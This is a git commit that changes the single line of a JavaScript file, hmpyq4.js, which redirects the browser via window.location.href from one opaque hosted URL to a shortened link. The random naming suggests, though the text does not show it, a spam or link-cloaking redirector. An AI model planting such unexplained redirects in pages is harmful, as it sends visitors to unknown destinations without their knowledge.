fbff2234630ca51525abd1d5c91bf32b035ef595
malcolms6 <151632134+malcolms6@users.noreply.github.com>
2023-12-18 19:21:43 +0800

    Update hmpyq4.js

--- hmpyq4.js
+++ hmpyq4.js
@@ -1,1 +1,1 @@
-window.location.href="https://static.clouderwork.com/file/22b2348a-83db-48ed-b728-1d6865c577f0__pp588_1669654.htm?id=vB9HRZFliGX3bcoturOUsVqfnAyTwz26"
+window.location.href="https://t.ctrip.cn/oH9s1W9"
